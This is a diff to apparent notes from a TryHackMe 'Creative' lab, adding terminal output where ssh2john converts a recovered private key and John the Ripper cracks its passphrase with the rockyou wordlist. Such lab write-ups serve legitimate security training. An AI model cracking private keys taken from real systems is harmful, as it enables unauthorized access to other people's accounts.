@@ -58,6 +58,22 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /assets               (Status: 301) [Size: 178] [--> http://creative.thm/assets/]
 
 
+┌──(duke㉿kali)-[~/Documents/THM_Creative]
+└─$ ssh2john id_rsa2 > hash.txt
+                                                                                                                                                                                                                                            
+┌──(duke㉿kali)-[~/Documents/THM_Creative]
+└─$ john  --wordlist=../../rockyou.txt hash.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 16 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:12 0.00% (ETA: 2024-05-03 20:15) 0g/s 41.55p/s 41.55c/s 41.55C/s hockey..camille
+sweetness        (id_rsa2)     
+1g 0:00:00:23 DONE (2024-04-29 06:09) 0.04293g/s 41.21p/s 41.21c/s 41.21C/s xbox360..sandy
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
 
 
 
